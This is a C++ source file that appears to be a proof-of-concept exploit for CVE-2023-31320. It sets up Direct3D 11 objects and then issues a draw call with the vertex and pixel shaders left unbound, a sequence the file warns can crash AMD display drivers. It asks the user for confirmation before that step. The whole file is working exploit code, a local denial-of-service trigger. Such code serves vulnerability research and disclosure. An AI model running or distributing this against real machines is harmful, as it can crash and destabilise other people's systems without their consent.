#include <iostream>
#include <d3d11.h>
#include <d3dcompiler.h>
#include <wrl.h>

using namespace Microsoft::WRL;

const FLOAT TriangleVertices[] = {
	 0.0f,  0.5f,  0.0f,
	 0.5f, -0.5f,  0.0f,
	-0.5f, -0.5f,  0.0f,
};

const CHAR VertexShaderCode[] = "float4 VSMain(in float4 Position : Position) : SV_Position { return Position; }";
// const CHAR PixelShaderCode[] = "float4 PSMain(in float4 Position : SV_Position) : SV_Target { return float4(1.0, 1.0, 1.0, 1.0); }";

std::wstring AsWString(
	ComPtr<ID3DBlob> Blob
) {
	UINT_PTR     Size;
	std::wstring Str;

	Str.resize(strnlen_s((const CHAR *)Blob->GetBufferPointer(), Blob->GetBufferSize() - 1));
	mbstowcs_s(&Size, &Str[0], Str.size() + 1, (const CHAR *)Blob->GetBufferPointer(), Blob->GetBufferSize() - 1);

	return Str;
}

LRESULT CALLBACK WindowProc(
	HWND   Window,
	UINT32 Message,
	WPARAM wParam,
	LPARAM lParam
) {
	switch (Message) {
	default:
		return DefWindowProcW(Window, Message, wParam, lParam);
	case WM_CLOSE:
		DestroyWindow(Window);
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
}

INT32 wmain() {
	HRESULT Res;

	WNDCLASSEXW Class = { };
	HWND        Window;
	WCHAR       Choice;

	ComPtr<ID3D11Buffer>           VertexBuffer;
	ComPtr<ID3DBlob>               VertexShader;
	ComPtr<ID3D11InputLayout>      InputLayout;
	ComPtr<IDXGISwapChain>         SwapChain;
	ComPtr<ID3D11DeviceContext>    Context;
	ComPtr<ID3D11Device>           Device;
	ComPtr<ID3D11RenderTargetView> Rtv;

	std::wcout << L"[*] Creating window\n";

	Class.cbSize        = sizeof(WNDCLASSEXW);
	Class.lpfnWndProc   = WindowProc;
	Class.hInstance     = GetModuleHandleW(NULL);
	Class.lpszClassName = L"CVE-2023-31320";

	RegisterClassExW(&Class);
	Window = CreateWindowExW(0, L"CVE-2023-31320", L"", 0, 0, 0, 0, 0, NULL, NULL, GetModuleHandleW(NULL), NULL);

	if (!Window) {
		std::wcerr << L"\033[1;91m[x] Failed to create window! GetLastError return code: " << GetLastError() << L"\033[0m\n";
		return 1;
	}

	std::wcout << L"[*] Creating Direct3D 11 device and swap chain\n";

	{
		DXGI_SWAP_CHAIN_DESC SwapChainDesc = { };

		SwapChainDesc.BufferCount       = 1;
		SwapChainDesc.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
		SwapChainDesc.BufferUsage       = DXGI_USAGE_RENDER_TARGET_OUTPUT;
		SwapChainDesc.OutputWindow      = Window;
		SwapChainDesc.SampleDesc.Count  = 1;
		SwapChainDesc.SwapEffect        = DXGI_SWAP_EFFECT_DISCARD;
		SwapChainDesc.Windowed          = TRUE;
	
		UINT32 CreationFlags = 0;
#if _DEBUG
		CreationFlags |= D3D11_CREATE_DEVICE_DEBUG;
#endif
		if (FAILED(Res = D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE,
			NULL, CreationFlags, NULL, 0, D3D11_SDK_VERSION, &SwapChainDesc, &SwapChain, &Device, NULL, &Context)))
		{
			std::wcerr << L"\033[1;91m[x] Failed to create device! D3D11CreateDeviceAndSwapChain return code: " << std::hex << Res << L"\033[0m\n";
			return 1;
		}
	}

	std::wcout << L"[*] Creating render target view\n";

	{
		ComPtr<ID3D11Resource> BackBuffer;
		
		SwapChain->GetBuffer(0, IID_PPV_ARGS(&BackBuffer));
	
		if (FAILED(Res = Device->CreateRenderTargetView(*BackBuffer.GetAddressOf(), NULL, &Rtv))) {
			std::wcerr << L"\033[1;91m[x] Failed to create render target view! ID3D11Device*->CreateRenderTargetView return code: " << std::hex << Res << L"\033[0m\n";
			return 1;
		}
	}

	std::wcout << L"[*] Creating vertex buffer\n";

	{
		D3D11_SUBRESOURCE_DATA BufferData = { };
		D3D11_BUFFER_DESC      BufferDesc = { };

		BufferData.pSysMem = &TriangleVertices;

		BufferDesc.ByteWidth = sizeof(TriangleVertices);
		BufferDesc.BindFlags = D3D11_BIND_VERTEX_BUFFER;
		BufferDesc.StructureByteStride = sizeof(TriangleVertices[0]);

		if (FAILED(Res = Device->CreateBuffer(&BufferDesc, &BufferData, &VertexBuffer))) {
			std::wcerr << L"\033[1;91m[x] Failed to create vertex buffer! ID3D11Device*->CreateBuffer return code: " << std::hex << Res << L"\033[0m\n";
			return 1;
		}
	}

	std::wcout << L"[*] Compiling vertex shader\n";

	{
		UINT32           ShaderFlags = 0;
		ComPtr<ID3DBlob> Errors;
#if _DEBUG
		ShaderFlags |= D3DCOMPILE_DEBUG | D3DCOMPILE_SKIP_OPTIMIZATION;
#endif
		if (FAILED(Res = D3DCompile(VertexShaderCode, sizeof(VertexShaderCode), NULL, NULL, NULL,
			"VSMain", "vs_5_0", ShaderFlags, 0, &VertexShader, &Errors)))
		{
			std::wcerr << L"\033[1;91m[x] Failed to compile vertex shader! D3DCompile return code: " << std::hex << Res << "\n" <<
				L"Compilation error output:\n" << AsWString(Errors) << L"\033[0m\n";

			return 1;
		}
	}

	std::wcout << L"[*] Creating input layout\n";

	{
		D3D11_INPUT_ELEMENT_DESC InputLayoutDesc[] = {
			{ "Position", 0, DXGI_FORMAT_R32G32B32_FLOAT, 0, 0, D3D11_INPUT_PER_VERTEX_DATA, 0 }
		};

		if (FAILED(Res = Device->CreateInputLayout(InputLayoutDesc, 1,
			VertexShader->GetBufferPointer(), VertexShader->GetBufferSize(), &InputLayout)))
		{
			std::wcerr << L"\033[1;91m[x] Failed to create input layout! ID3D11Device*->CreateInputLayout return code: " << std::hex << Res << L"\033[0m\n";
			return 1;
		}
	}

	std::wcout << L"\033[1;33m[!] Are you sure you want to continue?\n" <<
		L"On a device with an AMD graphics card, your display driver may crash and become unstable!\n" <<
		L"(Y/N) \033[0m";

	Choice = getwchar();
	if (Choice != L'Y' && Choice != L'y') {
		std::wcout << L"\033[1;92m[v] Aborting\033[0m\n";
		return 0;
	}

	std::wcout << L"[*] Sending commands to immediate context\n";
	
	{
		const UINT32 Strides[] = { sizeof(FLOAT) * 3 };
		const UINT32 Offsets[] = { 0 };

		D3D11_VIEWPORT                Viewports[] = { { } };
		ID3D11RenderTargetView *const Views[]     = { *Rtv.GetAddressOf() };
		ID3D11Buffer *const           Buffers[]   = { *VertexBuffer.GetAddressOf() };

		// Shaders unbound

		Context->RSSetViewports(1, Viewports);
		Context->OMSetRenderTargets(1, Views, NULL);
		Context->IASetPrimitiveTopology(D3D11_PRIMITIVE_TOPOLOGY_TRIANGLELIST);
		Context->IASetInputLayout(*InputLayout.GetAddressOf());
		// Context->VSSetShader(..., NULL, 0);
		// Context->PSSetShader(..., NULL, 0);
		Context->IASetVertexBuffers(0, 1, Buffers, Strides, Offsets);
		Context->Draw(sizeof(TriangleVertices) / Strides[0], 0);
	}

	std::wcout << L"[*] Swapping buffers\n";

	SwapChain->Present(0, 0);

	std::wcout << L"[*] Cleaning up\n";

	DestroyWindow(Window);
	UnregisterClassW(Class.lpszClassName, Class.hInstance);

	std::wcout << L"\033[1;92m[v] Finished\033[0m\n";

	return 0;
}